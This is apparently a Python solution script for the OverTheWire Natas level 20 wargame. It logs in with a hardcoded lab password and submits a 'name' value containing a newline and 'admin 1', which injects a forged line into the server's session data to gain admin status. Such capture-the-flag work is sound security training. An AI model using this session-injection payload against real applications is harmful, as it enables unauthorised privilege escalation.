import requests
import string
import time

username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

url = 'http://{}.natas.labs.overthewire.org'.format(username)

payload = {
    'name': 'kek\nadmin 1'
}

with requests.Session() as session:
    session.get(url, auth = (username, password))
    response = session.post(url, auth = (username, password), data = payload)
    print(response.text)
